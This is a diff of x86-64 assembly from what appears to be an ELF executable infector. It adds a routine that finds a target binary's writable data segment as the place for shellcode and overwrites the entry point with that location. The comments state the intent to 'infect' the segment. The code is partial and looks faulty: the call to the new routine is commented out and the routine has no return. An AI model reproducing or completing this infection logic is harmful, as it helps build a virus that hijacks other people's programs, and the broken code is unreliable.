@@ -452,6 +452,7 @@ parse64elfheader:
 	push rdx
 
 	sub rsp, 8; new entrypoint stocked here
+;	call find_new_entry; will put it in rax
 	;Copy the begining of Elf header till entry
 	mov rbx, rdi
 	mov rdi, rsi
@@ -460,7 +461,7 @@ parse64elfheader:
 	mov rax, 1
 	syscall; write(wfd, file, sizeof(Elf64_Ehdr));
 	;Time to handle the entrypoint
-	mov QWORD[rsp], QWORD 0x41424344; change by rax after calling func to find new entry
+	mov QWORD[rsp], rax; change by rax after calling func to find new entry
 	add rsi, 32 ; points right after the entrypoint
 	mov rbx, rsi ; store rsi void *file+32
 	mov rsi, rsp
@@ -481,7 +482,56 @@ parse64elfheader:
 	pop rdi
 retn
 %define SHELLCODE_LEN 1
+; unsigned long find_new_entry(void *file, int wfd)
+; will return the offset to begining of our shellcode
+find_new_entry:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
 
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_fne: 
+		cmp cx, WORD[rsp]
+		jge loop_fne_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_fne
+		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_fne
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		mov rax, QWORD[r9 + 40];store p_memsz
+		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
+		continue_fne:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_fne
+	loop_fne_exit: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+
+
+; unsigned long parse64elfphdr(void *file, int wfd)
 parse64elfphdr:
 	push rdi
 	push rsi
